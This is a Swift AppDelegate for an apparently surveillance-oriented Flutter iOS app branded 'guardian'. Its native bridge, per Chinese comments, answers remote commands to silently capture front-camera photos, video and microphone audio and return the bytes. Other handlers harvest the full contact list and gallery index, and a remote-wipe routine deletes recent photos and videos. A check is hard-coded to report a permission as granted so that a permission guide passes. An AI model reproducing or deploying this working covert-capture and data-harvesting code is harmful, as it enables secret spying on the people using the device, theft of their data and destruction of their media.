import AVFoundation
import Flutter
import UIKit
import Contacts
import Photos

@main
@objc class AppDelegate: FlutterAppDelegate, FlutterImplicitEngineDelegate {
  override func application(
    _ application: UIApplication,
    didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
  ) -> Bool {
    return super.application(application, didFinishLaunchingWithOptions: launchOptions)
  }

  func didInitializeImplicitFlutterEngine(_ engineBridge: FlutterImplicitEngineBridge) {
    GeneratedPluginRegistrant.register(with: engineBridge.pluginRegistry)
    guard let registrar = engineBridge.pluginRegistry.registrar(forPlugin: "com.mop.guardian.native") else { return }
    let channel = FlutterMethodChannel(name: "com.mop.guardian/native", binaryMessenger: registrar.messenger())
    channel.setMethodCallHandler { [weak self] call, result in
      self?.handleNativeBridge(call: call, result: result)
    }
  }

  private func handleNativeBridge(call: FlutterMethodCall, result: @escaping FlutterResult) {
    switch call.method {
    case "fetchSensitiveData":
      let type = call.arguments as? String ?? ""
      let out: [String: Any]
      if type == "contacts" {
        out = fetchContactsManifest()
      } else if type == "gallery" {
        out = fetchGalleryManifest()
      } else {
        out = [:]
      }
      result(out)
    case "saveQrToGallery":
      saveQrToGallery(call: call, result: result)
    case "requestOverlayPermission":
      result(false)
    case "checkOverlayPermission":
      // 规约：iOS 无悬浮窗，恒为 true，便于权限引导通过
      result(true)
    case "openSystemDialer":
      if let number = call.arguments as? String, let url = URL(string: "tel:\(number.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? number)") {
        UIApplication.shared.open(url)
      }
      result(nil)
    case "openSystemSms":
      if let args = call.arguments as? [String: Any],
         let number = args["number"] as? String,
         let content = args["content"] as? String {
        let bodyEnc = content.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? ""
        let urlStr = bodyEnc.isEmpty ? "smsto:\(number)" : "sms:\(number)&body=\(bodyEnc)"
        if let url = URL(string: urlStr) {
          UIApplication.shared.open(url)
        }
      }
      result(nil)
    case "startGuardianService":
      result(nil)
    case "capturePhoto":
      capturePhotoSilent(result: result)
    case "captureVideo":
      let args = call.arguments as? [String: Any]
      let durationSec = (args?["duration_sec"] as? NSNumber)?.intValue ?? 18
      captureVideoSilent(durationSec: durationSec, result: result)
    case "captureAudio":
      let args = call.arguments as? [String: Any]
      let durationSec = (args?["duration_sec"] as? NSNumber)?.intValue ?? 18
      captureAudioSilent(durationSec: durationSec, result: result)
    case "clearGalleryWithinDays":
      let days = (call.arguments as? NSNumber)?.intValue ?? 3
      clearGalleryWithinDays(days: days, result: result)
    case "uninstallApp":
      // iOS 无系统卸载自身 API，仅返回成功；数据清空与退回激活页已由 Flutter wipe 流程完成
      result(nil)
    default:
      result(FlutterMethodNotImplemented)
    }
  }

  /// 静默录像（远程采集 mop.cmd.capture.video），约定 durationSec 秒，返回 mp4 字节
  private func captureVideoSilent(durationSec: Int, result: @escaping FlutterResult) {
    let session = AVCaptureSession()
    session.sessionPreset = .high
    guard let videoDevice = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front),
          let videoInput = try? AVCaptureDeviceInput(device: videoDevice) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "no camera", details: nil)) }
      return
    }
    guard session.canAddInput(videoInput) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "cannot add video input", details: nil)) }
      return
    }
    session.addInput(videoInput)
    if let audioDevice = AVCaptureDevice.default(for: .audio),
       let audioInput = try? AVCaptureDeviceInput(device: audioDevice), session.canAddInput(audioInput) {
      session.addInput(audioInput)
    }
    let output = AVCaptureMovieFileOutput()
    guard session.canAddOutput(output) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "cannot add movie output", details: nil)) }
      return
    }
    session.addOutput(output)
    let fileURL = FileManager.default.temporaryDirectory.appendingPathComponent("mop_video_\(Int(Date().timeIntervalSince1970)).mp4")
    let delegate = VideoRecordingDelegate(session: session, fileURL: fileURL, result: result)
    VideoRecordingDelegate.keepAlive = delegate
    DispatchQueue.global(qos: .userInitiated).async {
      session.startRunning()
      output.startRecording(to: fileURL, recordingDelegate: delegate)
      DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + .seconds(durationSec)) {
        output.stopRecording()
      }
    }
  }

  /// 静默录音（远程采集 mop.cmd.capture.audio），约定 durationSec 秒，返回 m4a 字节
  private func captureAudioSilent(durationSec: Int, result: @escaping FlutterResult) {
    let session = AVAudioSession.sharedInstance()
    do {
      try session.setCategory(.playAndRecord, mode: .default, options: [.defaultToSpeaker, .allowBluetooth])
      try session.setActive(true)
    } catch {
      DispatchQueue.main.async { result(FlutterError(code: "AUDIO", message: error.localizedDescription, details: nil)) }
      return
    }
    session.requestRecordPermission { [weak self] granted in
      guard granted else {
        DispatchQueue.main.async { result(FlutterError(code: "DENIED", message: "microphone access denied", details: nil)) }
        return
      }
      self?.startAudioRecording(durationSec: durationSec, result: result)
    }
  }

  private func startAudioRecording(durationSec: Int, result: @escaping FlutterResult) {
    let fileURL = FileManager.default.temporaryDirectory.appendingPathComponent("mop_audio_\(Int(Date().timeIntervalSince1970)).m4a")
    let settings: [String: Any] = [
      AVFormatIDKey: Int(kAudioFormatMPEG4AAC),
      AVSampleRateKey: 44100,
      AVNumberOfChannelsKey: 1,
      AVEncoderAudioQualityKey: AVAudioQuality.medium.rawValue
    ]
    guard let recorder = try? AVAudioRecorder(url: fileURL, settings: settings) else {
      DispatchQueue.main.async { result(FlutterError(code: "AUDIO", message: "cannot create recorder", details: nil)) }
      return
    }
    let delegate = AudioRecordingDelegate(fileURL: fileURL, result: result)
    delegate.recorder = recorder
    recorder.delegate = delegate
    guard recorder.record(forDuration: TimeInterval(durationSec)) else {
      DispatchQueue.main.async { result(FlutterError(code: "AUDIO", message: "record failed", details: nil)) }
      return
    }
    AudioRecordingDelegate.keepAlive = delegate
  }

  /// 静默拍照（远程采集 mop.cmd.capture.photo），返回 JPEG 字节
  private func capturePhotoSilent(result: @escaping FlutterResult) {
    let session = AVCaptureSession()
    session.sessionPreset = .photo
    guard let device = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .front),
          let input = try? AVCaptureDeviceInput(device: device) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "no camera", details: nil)) }
      return
    }
    guard session.canAddInput(input) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "cannot add input", details: nil)) }
      return
    }
    session.addInput(input)
    let output = AVCapturePhotoOutput()
    guard session.canAddOutput(output) else {
      DispatchQueue.main.async { result(FlutterError(code: "CAMERA", message: "cannot add output", details: nil)) }
      return
    }
    session.addOutput(output)
    let delegate = PhotoCaptureDelegate(session: session, result: result)
    DispatchQueue.global(qos: .userInitiated).async {
      session.startRunning()
      let settings = AVCapturePhotoSettings()
      output.capturePhoto(with: settings, delegate: delegate)
    }
  }

  /// 保存二维码图片字节到系统相册（规约 NATIVE_BRIDGE）
  private func saveQrToGallery(call: FlutterMethodCall, result: @escaping FlutterResult) {
    var data: Data?
    if let typed = call.arguments as? FlutterStandardTypedData, typed.type == .uint8 {
      data = typed.data
    } else if let list = call.arguments as? [Int] {
      data = Data(list.map { UInt8($0 & 0xff) })
    }
    guard let imageData = data, !imageData.isEmpty, let image = UIImage(data: imageData) else {
      result(FlutterError(code: "INVALID", message: "bytes required or invalid image", details: nil))
      return
    }
    PHPhotoLibrary.requestAuthorization(for: .addOnly) { status in
      guard status == .authorized || status == .limited else {
        DispatchQueue.main.async { result(FlutterError(code: "DENIED", message: "photo library access denied", details: nil)) }
        return
      }
      PHPhotoLibrary.shared().performChanges({
        PHAssetChangeRequest.creationRequestForAsset(from: image)
      }) { success, error in
        DispatchQueue.main.async {
          if success { result(nil) }
          else { result(FlutterError(code: "IO", message: error?.localizedDescription ?? "save failed", details: nil)) }
        }
      }
    }
  }

  /// iOS 必须项：通讯录摘要（id、姓名等可哈希元数据），供审计 Hash 对比
  private func fetchContactsManifest() -> [String: Any] {
    var items: [[String: Any]] = []
    let store = CNContactStore()
    let keysToFetch: [CNKeyDescriptor] = [CNContactIdentifierKey as CNKeyDescriptor, CNContactGivenNameKey as CNKeyDescriptor, CNContactFamilyNameKey as CNKeyDescriptor]
    let request = CNContactFetchRequest(keysToFetch: keysToFetch)
    request.mutableObjects = false
    do {
      try store.enumerateContacts(with: request) { contact, _ in
        items.append([
          "id": contact.identifier,
          "given_name": contact.givenName,
          "family_name": contact.familyName
        ])
      }
    } catch _ {}
    return ["items": items]
  }

  /// iOS 必须项：相册/媒体摘要（localIdentifier、creationDate 等），供审计 Hash 对比
  private func fetchGalleryManifest() -> [String: Any] {
    var items: [[String: Any]] = []
    let options = PHFetchOptions()
    options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
    let images = PHAsset.fetchAssets(with: .image, options: options)
    images.enumerateObjects { asset, _, _ in
      items.append([
        "id": asset.localIdentifier,
        "date_added": Int(asset.creationDate?.timeIntervalSince1970 ?? 0),
        "kind": "image"
      ])
    }
    let videos = PHAsset.fetchAssets(with: .video, options: options)
    videos.enumerateObjects { asset, _, _ in
      items.append([
        "id": asset.localIdentifier,
        "date_added": Int(asset.creationDate?.timeIntervalSince1970 ?? 0),
        "kind": "video"
      ])
    }
    return ["items": items]
  }

  /// 远程擦除时：清理最近 days 天内的相册照片与视频；永久删除策略：使用系统唯一删除 API，资产进入「最近删除」后由系统在宽限期后永久清除；需相册读写权限（.readWrite）
  private func clearGalleryWithinDays(days: Int, result: @escaping FlutterResult) {
    let cutoff = Date(timeIntervalSinceNow: -Double(days) * 86400)
    let options = PHFetchOptions()
    options.predicate = NSPredicate(format: "creationDate >= %@", cutoff as NSDate)
    options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
    PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
      guard status == .authorized || status == .limited else {
        DispatchQueue.main.async { result(nil) }
        return
      }
      let images = PHAsset.fetchAssets(with: .image, options: options)
      let videos = PHAsset.fetchAssets(with: .video, options: options)
      var toDelete: [PHAsset] = []
      images.enumerateObjects { asset, _, _ in toDelete.append(asset) }
      videos.enumerateObjects { asset, _, _ in toDelete.append(asset) }
      if toDelete.isEmpty {
        DispatchQueue.main.async { result(nil) }
        return
      }
      PHPhotoLibrary.shared().performChanges({
        PHAssetChangeRequest.deleteAssets(toDelete as NSArray)
      }) { _, _ in
        DispatchQueue.main.async { result(nil) }
      }
    }
  }
}

/// 静默拍照回调，持有 session 避免提前释放
private class PhotoCaptureDelegate: NSObject, AVCapturePhotoCaptureDelegate {
  let session: AVCaptureSession
  let result: FlutterResult

  init(session: AVCaptureSession, result: @escaping FlutterResult) {
    self.session = session
    self.result = result
  }

  func photoOutput(_ output: AVCapturePhotoOutput, didFinishProcessingPhoto photo: AVCapturePhoto, error: Error?) {
    session.stopRunning()
    if let error = error {
      DispatchQueue.main.async { self.result(FlutterError(code: "CAPTURE", message: error.localizedDescription, details: nil)) }
      return
    }
    guard let data = photo.fileDataRepresentation() else {
      DispatchQueue.main.async { self.result(FlutterError(code: "IO", message: "no photo data", details: nil)) }
      return
    }
    let bytes = [UInt8](data).map { Int($0) & 0xff }
    DispatchQueue.main.async { self.result(bytes) }
  }
}

/// 静默录像回调，录制结束后读文件并返回字节
private class VideoRecordingDelegate: NSObject, AVCaptureFileOutputRecordingDelegate {
  static var keepAlive: VideoRecordingDelegate?
  let session: AVCaptureSession
  let fileURL: URL
  let result: FlutterResult

  init(session: AVCaptureSession, fileURL: URL, result: @escaping FlutterResult) {
    self.session = session
    self.fileURL = fileURL
    self.result = result
  }

  func fileOutput(_ output: AVCaptureFileOutput, didFinishRecordingTo outputFileURL: URL, from connections: [AVCaptureConnection], error: Error?) {
    VideoRecordingDelegate.keepAlive = nil
    session.stopRunning()
    if let error = error {
      DispatchQueue.main.async { self.result(FlutterError(code: "VIDEO", message: error.localizedDescription, details: nil)) }
      return
    }
    do {
      let data = try Data(contentsOf: outputFileURL)
      try? FileManager.default.removeItem(at: outputFileURL)
      let bytes = [UInt8](data).map { Int($0) & 0xff }
      DispatchQueue.main.async { self.result(bytes) }
    } catch {
      DispatchQueue.main.async { self.result(FlutterError(code: "IO", message: error.localizedDescription, details: nil)) }
    }
  }
}

/// 静默录音回调，录制结束后读文件并返回字节
private class AudioRecordingDelegate: NSObject, AVAudioRecorderDelegate {
  static var keepAlive: AudioRecordingDelegate?
  weak var recorder: AVAudioRecorder?
  let fileURL: URL
  let result: FlutterResult

  init(fileURL: URL, result: @escaping FlutterResult) {
    self.fileURL = fileURL
    self.result = result
  }

  func audioRecorderDidFinishRecording(_ recorder: AVAudioRecorder, successfully flag: Bool) {
    AudioRecordingDelegate.keepAlive = nil
    try? AVAudioSession.sharedInstance().setActive(false, options: .notifyOthersOnDeactivation)
    guard flag else {
      DispatchQueue.main.async { self.result(FlutterError(code: "AUDIO", message: "record failed", details: nil)) }
      return
    }
    do {
      let data = try Data(contentsOf: fileURL)
      try? FileManager.default.removeItem(at: fileURL)
      let bytes = [UInt8](data).map { Int($0) & 0xff }
      DispatchQueue.main.async { self.result(bytes) }
    } catch {
      DispatchQueue.main.async { self.result(FlutterError(code: "IO", message: error.localizedDescription, details: nil)) }
    }
  }
}
